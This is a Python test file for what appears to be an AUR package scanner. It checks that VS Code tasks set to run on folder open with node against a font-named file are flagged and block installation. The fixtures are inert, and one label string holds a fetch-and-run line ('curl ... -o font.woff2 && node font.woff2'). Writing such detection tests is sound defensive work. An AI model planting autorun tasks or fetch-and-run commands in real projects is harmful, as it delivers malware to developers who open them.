"""Editor-task integration uses temporary roots and inert bytes, never commands."""

import hashlib
import io
import json
import os
from pathlib import Path
import socket
import subprocess
import tarfile

import pytest

from aurascan.analyzers.deep_static import DeepStaticAnalyzer
from aurascan.analyzers.deterministic import DeterministicAnalyzer
from aurascan.analyzers.history import HistoryAnalyzer
from aurascan.analyzers.source_metadata import SourceMetadataAnalyzer
from aurascan.core.cache import ScanCache
from aurascan.core import engine as engine_module
from aurascan.core.engine import AuraScanEngine
from aurascan.core.models import AnalysisResult, Phase, Severity
from aurascan.core import repository_provenance as repository
from aurascan.core.source_acquisition import SourceFetcher, SourcePolicy


AUTORUN = "EDITOR-TASK-AUTORUN-CARRIER-001"
INCOMPLETE = "EDITOR-TASK-INSPECTION-INCOMPLETE-001"
PRIVATE_LABEL = "INERT_EDITOR_LABEL_DO_NOT_DISPLAY"
FONT = b"INERT FONT-NAMED DATA. NOT EXECUTABLE CODE OR A REAL FONT.\n"
BUILD = "pkgname=editor-integration\npkgver=1\npkgrel=1\npackage() { :; }\n"


@pytest.fixture(autouse=True)
def isolated_static_only(tmp_path, monkeypatch):
    home = tmp_path / "private-home"
    home.mkdir()
    monkeypatch.setenv("HOME", str(home))
    monkeypatch.setenv("XDG_CACHE_HOME", str(home / "cache"))
    monkeypatch.setenv("XDG_CONFIG_HOME", str(home / "config"))
    monkeypatch.setenv("XDG_STATE_HOME", str(home / "state"))
    monkeypatch.setenv("AURASCAN_AI", "off")

    def forbidden(*_args, **_kwargs):
        pytest.fail("editor-task integration must not execute commands or use the network")

    monkeypatch.setattr(subprocess, "Popen", forbidden)
    monkeypatch.setattr(subprocess, "run", forbidden)
    monkeypatch.setattr(os, "system", forbidden)
    monkeypatch.setattr(os, "popen", forbidden)
    monkeypatch.setattr(socket, "socket", forbidden)
    monkeypatch.setattr(socket, "getaddrinfo", forbidden)


class InertClamAV:
    def scan_source_archive(self, *_args, **_kwargs):
        return AnalysisResult(True, "injected inert archive result", [])

    def scan_unpacked_source(self, *_args, **_kwargs):
        return AnalysisResult(True, "injected inert source result", [])


def task_bytes(automatic=True, command="node", args=None, label=PRIVATE_LABEL):
    task = {"label": label, "type": "process", "command": command,
            "args": ["${workspaceFolder}/font.woff2"] if args is None else args}
    if automatic:
        task["runOptions"] = {"runOn": "folderOpen"}
    return json.dumps({"version": "2.0.0", "tasks": [task]}).encode("utf-8")


def package_root(tmp_path, payload=None):
    root = tmp_path / "package"
    root.mkdir()
    (root / "PKGBUILD").write_text(BUILD, encoding="utf-8")
    (root / ".vscode").mkdir()
    (root / ".vscode" / "tasks.json").write_bytes(task_bytes() if payload is None else payload)
    (root / "font.woff2").write_bytes(FONT)
    return root


def engine_for(tmp_path, **options):
    engine = AuraScanEngine(offline=True, auto_key_fetch=False, **options)
    engine.cache = ScanCache(tmp_path / "scan-cache")
    engine.analyzers = [DeterministicAnalyzer(), SourceMetadataAnalyzer()]
    return engine


def deep_analyzer(**options):
    return DeepStaticAnalyzer(
        clamav=InertClamAV(),
        source_fetcher=SourceFetcher(SourcePolicy(offline=True, auto_key_fetch=False)),
        **options
    )


def test_default_scan_blocks_editor_autorun_without_package_control_execution(tmp_path):
    root = package_root(tmp_path)
    engine = engine_for(tmp_path)

    assert engine.scan_pkgbuild(str(root / "PKGBUILD"), "editor-integration", "1") is False

    finding = next(value for value in engine.last_report["findings"] if value["rule_id"] == AUTORUN)
    assert finding["severity"] == "CRITICAL" and finding["blocks_installation"] is True
    assert finding["phase"] == "pkgbuild_static"
    assert engine.last_report["risk_summary"]["recommended_action"] == "block"
    assert PRIVATE_LABEL not in json.dumps(engine.last_report)
    assert (root / "font.woff2").read_bytes() == FONT


def test_engine_uses_captured_task_bytes_after_path_changes(tmp_path, monkeypatch):
    root = package_root(tmp_path)
    engine = engine_for(tmp_path)
    original_capture = engine_module.capture_package_scan_input

    def capture_then_replace(*args, **kwargs):
        captured = original_capture(*args, **kwargs)
        (root / ".vscode" / "tasks.json").write_bytes(task_bytes(automatic=False))
        return captured

    monkeypatch.setattr(engine_module, "capture_package_scan_input", capture_then_replace)
    assert engine.scan_pkgbuild(str(root / "PKGBUILD"), "editor-integration", "1") is False
    assert AUTORUN in {finding["rule_id"] for finding in engine.last_report["findings"]}
    assert (root / ".vscode" / "tasks.json").read_bytes() == task_bytes(automatic=False)


def test_changed_task_invalidates_a_previously_cached_allow(tmp_path, capsys):
    root = package_root(tmp_path, task_bytes(automatic=False))
    engine = engine_for(tmp_path)
    pkgbuild = root / "PKGBUILD"
    original_build = pkgbuild.read_bytes()

    assert engine.scan_pkgbuild(str(pkgbuild), "editor-integration", "1") is True
    initial_digest = engine.last_scan_input_digest
    capsys.readouterr()
    assert engine.scan_pkgbuild(str(pkgbuild), "editor-integration", "1") is True
    output = capsys.readouterr()
    assert "(CACHED)" in output.out + output.err

    (root / ".vscode" / "tasks.json").write_bytes(task_bytes())
    assert engine.scan_pkgbuild(str(pkgbuild), "editor-integration", "1") is False
    assert engine.last_scan_input_digest != initial_digest
    assert pkgbuild.read_bytes() == original_build
    assert AUTORUN in {finding["rule_id"] for finding in engine.last_report["findings"]}


@pytest.mark.parametrize("payload, rule_id", [
    (task_bytes(), AUTORUN),
    (b'{"version":"2.0.0","tasks":"unsupported"}', INCOMPLETE),
])
def test_new_only_update_skip_cannot_waive_editor_task_blocker(tmp_path, payload, rule_id):
    root = package_root(tmp_path, task_bytes(automatic=False))
    history = HistoryAnalyzer(tmp_path / "history.db")
    initial = engine_for(tmp_path)
    initial.analyzers.insert(0, history)
    assert initial.scan_pkgbuild(str(root / "PKGBUILD"), "editor-integration", "1") is True
    assert initial.last_report["trusted_baseline_updated"] is True

    (root / ".vscode" / "tasks.json").write_bytes(payload)
    (root / "PKGBUILD").write_text(BUILD.replace("pkgver=1", "pkgver=2"), encoding="utf-8")
    update = engine_for(tmp_path, update_scan_policy="new-only", scan_context="update",
                        scan_context_source="test_fixture")
    update.analyzers.insert(0, history)
    assert update.scan_pkgbuild(str(root / "PKGBUILD"), "editor-integration", "2") is False
    assert update.last_report["fast_path_decision"]["action"] == "skip_update_scan"
    assert rule_id in {finding["rule_id"] for finding in update.last_report["findings"]}
    assert update.last_report["trusted_baseline_updated"] is False


@pytest.mark.parametrize("source", [
    ".vscode/tasks.json::https://example.invalid/tasks.json",
    ".vscode::git+https://example.invalid/project.git",
])
def test_source_owned_exclusions_cannot_hide_observed_editor_task_authority(tmp_path, source):
    root = package_root(tmp_path)
    (root / "PKGBUILD").write_text(
        BUILD + "source=('" + source + "')\nsha256sums=('SKIP')\n",
        encoding="utf-8",
    )
    engine = engine_for(tmp_path)
    assert engine.scan_pkgbuild(str(root / "PKGBUILD"), "editor-integration", "1") is False
    assert AUTORUN in {finding["rule_id"] for finding in engine.last_report["findings"]}
    captured = engine.last_scan_input.repository_snapshot
    assert [task.relative_path for task in captured.editor_tasks] == [".vscode/tasks.json"]


@pytest.mark.parametrize("payload", [
    task_bytes(automatic=False),
    task_bytes(command="echo", args=["node font.woff2"],
               label="curl https://example.invalid/inert -o font.woff2 && node font.woff2"),
    task_bytes(args=["${workspaceFolder}/build.js"]),
])
def test_manual_tasks_labels_and_ordinary_scripts_do_not_promote_font_presence(tmp_path, payload):
    root = package_root(tmp_path, payload)
    (root / "build.js").write_text("// Inert ordinary build-script placeholder.\n", encoding="utf-8")
    engine = engine_for(tmp_path)
    assert engine.scan_pkgbuild(str(root / "PKGBUILD"), "editor-integration", "1") is True
    assert AUTORUN not in {finding["rule_id"] for finding in engine.last_report["findings"]}

    findings = deep_analyzer().inspect_source_tree(root)
    assert not any(finding.blocks_installation for finding in findings)
    assert {AUTORUN, "DEEPSTATIC-NETWORK-FETCH", "DEEPSTATIC-OPAQUE-CARRIER-EXEC-001"}.isdisjoint(
        finding.rule_id for finding in findings
    )


@pytest.mark.parametrize("payload", [b'{"tasks":', b'{"version":"2.0.0","tasks":"invalid"}'])
def test_malformed_captured_tasks_fail_closed_in_both_scan_surfaces(tmp_path, payload):
    root = package_root(tmp_path, payload)
    engine = engine_for(tmp_path)
    assert engine.scan_pkgbuild(str(root / "PKGBUILD"), "editor-integration", "1") is False
    finding = next(value for value in engine.last_report["findings"] if value["rule_id"] == INCOMPLETE)
    assert finding["severity"] == "HIGH" and finding["blocks_installation"] is True

    findings = deep_analyzer().inspect_source_tree(root)
    finding = next(value for value in findings if value.rule_id == INCOMPLETE)
    assert finding.severity == Severity.HIGH and finding.blocks_installation is True
    assert AUTORUN not in {value.rule_id for value in findings}


def test_snapshot_keeps_exact_immutable_task_bytes_and_excludes_lookalike_paths(tmp_path):
    # Exercise the whole JSON snapshot, including bytes beyond the magic prefix.
    payload = task_bytes(label=PRIVATE_LABEL + "x" * 5000)
    assert len(payload) > repository.MAX_MAGIC_BYTES
    root = package_root(tmp_path, payload)
    for relative in ("tasks.json", "docs/tasks.json", ".vscode/tasks.json.backup", ".vscode/Tasks.json"):
        path = root / relative
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_bytes(payload)

    snapshot = repository.capture_repository_snapshot(root)
    assert snapshot.status == repository.REPOSITORY_COMPLETE
    assert [value.relative_path for value in snapshot.editor_tasks] == [".vscode/tasks.json"]
    captured = snapshot.editor_tasks[0]
    assert captured.payload == payload
    assert captured.sha256 == hashlib.sha256(payload).hexdigest()
    assert PRIVATE_LABEL not in repr(snapshot)

    (root / ".vscode" / "tasks.json").write_bytes(task_bytes(automatic=False))
    newer = repository.capture_repository_snapshot(root)
    assert captured.payload == payload
    assert newer.input_digest != snapshot.input_digest


@pytest.mark.parametrize("linked", ["task", "directory"])
def test_unsafe_task_link_fails_closed_without_reading_its_target(tmp_path, monkeypatch, linked):
    root = package_root(tmp_path, task_bytes(automatic=False))
    outside = tmp_path / "outside"
    outside.mkdir()
    target = outside / "tasks.json"
    target.write_bytes(task_bytes())
    task = root / ".vscode" / "tasks.json"
    task.unlink()
    if linked == "task":
        task.symlink_to(target)
    else:
        task.parent.rmdir()
        task.parent.symlink_to(outside, target_is_directory=True)
    target_identity = (target.stat().st_dev, target.stat().st_ino)
    original_read = os.read

    def reject_target_read(descriptor, count):
        info = os.fstat(descriptor)
        assert (info.st_dev, info.st_ino) != target_identity
        return original_read(descriptor, count)

    monkeypatch.setattr(os, "read", reject_target_read)
    snapshot = repository.capture_repository_snapshot(root)
    assert snapshot.status == repository.REPOSITORY_UNINSPECTED
    engine = engine_for(tmp_path)
    assert engine.scan_pkgbuild(str(root / "PKGBUILD"), "editor-integration", "1") is False
    assert AUTORUN not in {value["rule_id"] for value in engine.last_report["findings"]}
    assert any(value["blocks_installation"] for value in engine.last_report["findings"])
    findings = deep_analyzer().inspect_source_tree(root)
    assert any(value.blocks_installation for value in findings)
    assert AUTORUN not in {value.rule_id for value in findings}


def test_task_replacement_during_snapshot_cannot_yield_a_complete_capture(tmp_path, monkeypatch):
    payload = task_bytes()
    root = package_root(tmp_path, payload)
    original_read = os.read
    replaced = False

    def replace_after_read(descriptor, count):
        nonlocal replaced
        chunk = original_read(descriptor, count)
        if chunk == payload and not replaced:
            replaced = True
            replacement = tmp_path / "replacement.json"
            replacement.write_bytes(payload)
            replacement.replace(root / ".vscode" / "tasks.json")
        return chunk

    monkeypatch.setattr(os, "read", replace_after_read)
    snapshot = repository.capture_repository_snapshot(root)
    assert replaced is True
    assert snapshot.status == repository.REPOSITORY_UNINSPECTED


@pytest.mark.parametrize("bound", ["bytes", "files", "total_bytes"])
def test_task_capture_caps_cannot_turn_partial_coverage_into_allow(tmp_path, monkeypatch, bound):
    payload = task_bytes(automatic=False)
    root = package_root(tmp_path, payload)
    if bound == "bytes":
        monkeypatch.setattr(repository, "MAX_EDITOR_TASK_BYTES", len(payload) - 1)
    else:
        second = root / "nested" / ".vscode"
        second.mkdir(parents=True)
        (second / "tasks.json").write_bytes(payload)
        if bound == "files":
            monkeypatch.setattr(repository, "MAX_EDITOR_TASK_FILES", 1)
        else:
            monkeypatch.setattr(repository, "MAX_EDITOR_TASK_TOTAL_BYTES", 2 * len(payload) - 1)
    assert repository.capture_repository_snapshot(root).status == repository.REPOSITORY_UNINSPECTED
    engine = engine_for(tmp_path)
    assert engine.scan_pkgbuild(str(root / "PKGBUILD"), "editor-integration", "1") is False
    assert any(value["blocks_installation"] for value in engine.last_report["findings"])
    assert AUTORUN not in {value["rule_id"] for value in engine.last_report["findings"]}


def test_deep_static_captures_nested_exact_task_paths_without_reinterpreting_other_json(tmp_path):
    root = package_root(tmp_path, task_bytes(automatic=False))
    nested = root / "nested" / ".vscode"
    nested.mkdir(parents=True)
    (nested / "tasks.json").write_bytes(task_bytes())
    (root / "nested" / "font.woff2").write_bytes(FONT)
    (root / "tasks.json").write_bytes(task_bytes())

    findings = deep_analyzer().inspect_source_tree(root)
    matching = [value for value in findings if value.rule_id == AUTORUN]
    assert len(matching) == 1
    assert matching[0].file_path == str(nested / "tasks.json")
    assert matching[0].phase == Phase.unpacked_source_scan
    assert matching[0].blocks_installation is True
    assert PRIVATE_LABEL not in repr(matching)


def test_offline_deep_static_acquisition_inspects_task_json_inside_inert_archive(tmp_path):
    archive = tmp_path / "source.tar"
    with tarfile.open(archive, "w") as output:
        for name, payload in (("project/.vscode/tasks.json", task_bytes()), ("project/font.woff2", FONT)):
            entry = tarfile.TarInfo(name)
            entry.size = len(payload)
            entry.mode = 0o644
            output.addfile(entry, io.BytesIO(payload))
    pkgbuild = tmp_path / "PKGBUILD"
    checksum = hashlib.sha256(archive.read_bytes()).hexdigest()
    pkgbuild.write_text(BUILD + "source=('source.tar')\nsha256sums=('" + checksum + "')\n", encoding="utf-8")

    result = deep_analyzer().analyze_pkgbuild(str(pkgbuild), pkgbuild.read_text(encoding="utf-8"))
    assert result.is_safe is False
    finding = next(value for value in result.findings if value.rule_id == AUTORUN)
    assert finding.phase == Phase.unpacked_source_scan and finding.blocks_installation is True
    assert PRIVATE_LABEL not in repr(result.findings)
